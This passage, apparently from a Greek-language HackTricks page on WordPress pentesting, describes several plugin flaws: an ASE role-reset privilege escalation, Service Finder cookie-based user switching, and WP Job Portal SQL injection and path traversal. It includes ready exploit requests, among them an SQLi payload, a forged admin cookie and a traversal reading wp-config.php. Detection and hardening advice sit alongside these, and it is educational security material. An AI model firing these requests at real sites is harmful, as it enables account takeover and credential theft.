- Αν ένας χρήστης προηγουμένως είχε υψηλότερα προνόμια αποθηκευμένα στο `_asenha_view_admin_as_original_roles` και υποβαθμίστηκε, μπορεί να τα επαναφέρει προσπελάζοντας το reset path.
- Σε κάποιες deployments, οποιοσδήποτε authenticated user θα μπορούσε να trigger ένα reset για άλλο username που εξακολουθεί να υπάρχει στο `viewing_admin_as_role_are` (broken authorization).

Attack prerequisites

- Ευάλωτη έκδοση του plugin με τη feature enabled.
- Ο target account έχει ένα stale high-privilege role αποθηκευμένο σε user meta από προηγούμενη χρήση.
- Οποιαδήποτε authenticated session; missing nonce/capability στη reset flow.

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Σε ευάλωτες builds αυτό αφαιρεί τους τρέχοντες ρόλους και επαναπροσθέτει τους αποθηκευμένους αρχικούς ρόλους (π.χ. `administrator`), αναβαθμίζοντας ουσιαστικά τα προνόμια.

Detection checklist

- Αναζητήστε λειτουργίες εναλλαγής ρόλων που διατηρούν «αρχικούς ρόλους» στο user meta (π.χ. `_asenha_view_admin_as_original_roles`).
- Εντοπίστε μονοπάτια reset/restore που:
- Διαβάζουν ονόματα χρηστών από `$_REQUEST` / `$_GET` / `$_POST`.
- Τροποποιούν ρόλους μέσω `add_role()` / `remove_role()` χωρίς `current_user_can()` και `wp_verify_nonce()` / `check_admin_referer()`.
- Εξουσιοδοτούν βάσει ενός plugin option array (π.χ. `viewing_admin_as_role_are`) αντί για τις δυνατότητες του ενεργούντος χρήστη.

Hardening

- Επιβάλετε έλεγχο δυνατοτήτων σε κάθε διακλάδωση που αλλάζει κατάσταση (π.χ. `current_user_can('manage_options')` ή αυστηρότερο).
- Απαιτήστε nonces για όλες τις μεταβολές ρόλων/εξουσιοδοτήσεων και επαληθεύστε τα: `check_admin_referer()` / `wp_verify_nonce()`.
- Ποτέ μην εμπιστεύεστε ονόματα χρηστών που παρέχονται στο request· επιλύστε τον επιδιωκόμενο χρήστη server-side με βάση τον αυθεντικοποιημένο χρήστη και την ρητή πολιτική.
- Ακυρώστε την κατάσταση «αρχικών ρόλων» στις ενημερώσεις προφίλ/ρόλων για να αποφύγετε την επαναφορά παλαιών υψηλών προνομίων:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
Σκεφτείτε την αποθήκευση ελάχιστης κατάστασης και τη χρήση time-limited, capability-guarded tokens για προσωρινές role switches.

---

### Unauthenticated privilege escalation μέσω cookie‑trusted user switching στο public `init` (Service Finder “sf-booking”)

Ορισμένα plugins συνδέουν helpers για user-switching στο δημόσιο hook `init` και εξάγουν την ταυτότητα από ένα cookie ελεγχόμενο από τον client. Εάν ο κώδικας καλεί `wp_set_auth_cookie()` χωρίς να επαληθεύει authentication, capability και έγκυρο nonce, οποιοσδήποτε unauthenticated επισκέπτης μπορεί να αναγκάσει το σύστημα να κάνει login ως οποιοδήποτε user ID.

Τυπικό ευάλωτο μοτίβο (απλοποιημένο από Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Γιατί είναι εκμεταλλεύσιμο

- Ο δημόσιος hook `init` κάνει τον handler προσβάσιμο από μη συνδεδεμένους χρήστες (δεν υπάρχει `is_user_logged_in()` guard).
- Η ταυτότητα προκύπτει από ένα cookie που μπορεί να τροποποιήσει ο client (`original_user_id`).
- Άμεση κλήση σε `wp_set_auth_cookie($uid)` συνδέει τον αιτούντα ως αυτόν τον χρήστη χωρίς έλεγχο δικαιωμάτων ή nonce.

Εκμετάλλευση (μη συνδεδεμένος χρήστης)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Τα generic edge/server WAFs είναι ρυθμισμένα για ευρείς pattern (SQLi, XSS, LFI). Πολλές high‑impact WordPress/plugin ευπάθειες είναι application‑specific logic/auth bugs που μοιάζουν με benign traffic εκτός αν ο engine κατανοεί τα WordPress routes και τα plugin semantics.

Offensive notes

- Στοχεύστε plugin‑specific endpoints με clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Δοκιμάστε πρώτα unauth paths (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads συχνά πετυχαίνουν χωρίς obfuscation.
- Τυπικές high‑impact περιπτώσεις: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Μην βασίζεστε σε generic WAF signatures για να προστατέψετε plugin CVEs. Εφαρμόστε application‑layer, vulnerability‑specific virtual patches ή κάντε update γρήγορα.
- Προτιμήστε positive‑security checks στον κώδικα (capabilities, nonces, strict input validation) αντί για negative regex filters.

## WordPress Protection

### Regular Updates

Βεβαιωθείτε ότι WordPress, plugins, και themes είναι ενημερωμένα. Επίσης επιβεβαιώστε ότι το automated updating είναι ενεργοποιημένο στο wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Επίσης, **εγκαταστήστε μόνο αξιόπιστα WordPress plugins και themes**.

### Πρόσθετα Ασφαλείας

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Άλλες Συστάσεις**

- Αφαιρέστε τον προεπιλεγμένο χρήστη **admin**
- Χρησιμοποιήστε **ισχυρούς κωδικούς πρόσβασης** και **2FA**
- Ελέγχετε περιοδικά τα **δικαιώματα** των χρηστών
- **Περιορίστε τις προσπάθειες σύνδεσης** για να αποτρέψετε επιθέσεις Brute Force
- Μετονομάστε το αρχείο **`wp-admin.php`** και επιτρέψτε πρόσβαση μόνο εσωτερικά ή από συγκεκριμένες διευθύνσεις IP.


### SQL Injection χωρίς αυθεντικοποίηση λόγω ανεπαρκούς επικύρωσης (WP Job Portal <= 2.3.2)

Το recruitment plugin WP Job Portal αποκάλυπτε μια εργασία **savecategory** που τελικά εκτελούσε τον ακόλουθο ευπαθή κώδικα μέσα στο `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Ανεπεξέργαστη είσοδος χρήστη** – `parentid` προέρχεται απευθείας από το αίτημα HTTP.
2. **Συγχώνευση συμβολοσειρών στο WHERE clause** – δεν υπάρχει `is_numeric()` / `esc_sql()` / prepared statement.
3. **Πρόσβαση χωρίς αυθεντικοποίηση** – αν και η ενέργεια εκτελείται μέσω `admin-post.php`, ο μοναδικός έλεγχος είναι ένα **CSRF nonce** (`wp_verify_nonce()`), το οποίο οποιοσδήποτε επισκέπτης μπορεί να ανακτήσει από μια δημόσια σελίδα που ενσωματώνει το shortcode `[wpjobportal_my_resumes]`.

#### Εκμετάλλευση

1. Πάρε ένα καινούργιο nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Εισάγετε arbitrary SQL εκμεταλλευόμενοι το `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Η απάντηση αποκαλύπτει το αποτέλεσμα του εγχυμένου query ή τροποποιεί τη βάση δεδομένων, αποδεικνύοντας SQLi.


### Μη αυθεντικοποιημένη Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Μια άλλη εργασία, **downloadcustomfile**, επέτρεπε σε επισκέπτες να κατεβάσουν **οποιοδήποτε αρχείο στο δίσκο** μέσω path traversal. Ο ευάλωτος sink βρίσκεται στο `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` είναι attacker-controlled και ενώνεται **without sanitisation**.  Πάλι, το μόνο εμπόδιο είναι ένα **CSRF nonce** που μπορεί να ανακτηθεί από τη σελίδα resume.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Ο διακομιστής επιστρέφει τα περιεχόμενα του `wp-config.php`, leaking DB credentials και auth keys.

## Αναφορές

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
